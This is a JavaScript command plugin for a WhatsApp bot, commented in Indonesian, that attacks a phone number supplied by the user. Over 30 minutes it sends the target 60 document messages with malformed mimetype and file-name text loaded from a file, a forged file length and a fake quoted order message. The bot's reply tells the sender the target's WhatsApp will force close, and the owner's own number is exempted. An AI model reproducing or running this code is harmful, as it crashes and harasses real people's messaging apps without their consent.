let { ngazap } = require('../src/ngazap.js')
let fs = require('fs')
doctext = fs.readFileSync('./src/doctext.txt')
let handler = async(m, { conn, usedPrefix, command, text }) => {
    let nomornya = text.replace(/[^0-9]/g, '')
    var troli = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", ...({"remoteJid":''}) }, "message": {orderMessage: {itemCount: 999999,status: 200, thumbnail: null, surface: 200, message: `© ScrLxrd Md Bot ✓`, orderTitle: `© ScrLxrd Md Bot ✓`, sellerJid: '0@s.whatsapp.net'}}}
    if (!text) { throw `Nomornya mana?Contoh : ${usedPrefix + command} 62857xx` 
    } else if (nomornya.includes('6283821123163')) {
        throw `ITU NOMOR OWNER BANH😅`
    } else {
    m.reply(`Berhasil Mengeksekusi Target
    
• Nomor: ${nomornya}
• Durasi: 30 Menit

Aplikasi WhatsApp Target Akan Force Close(Tidak Bisa di Buka) Selama 30 Menit Dari sekarang`)
for (let i = 0;i < 60;i++) {
conn.sendMessage(nomornya + '@s.whatsapp.net', { document: fs.readFileSync('./src/menu.jpg'), mimetype: `${doctext}`, fileName: `${doctext}.pdf`, fileLength: 9999999999, }, { quoted: troli })
await conn.delay(30000)
}
    }
}
handler.premium = true
handler.tags = ['premium']
handler.help = ['atk30menit']
handler.command = /^(atk30menit|santed30menit|serang30menit)$/i

module.exports = handler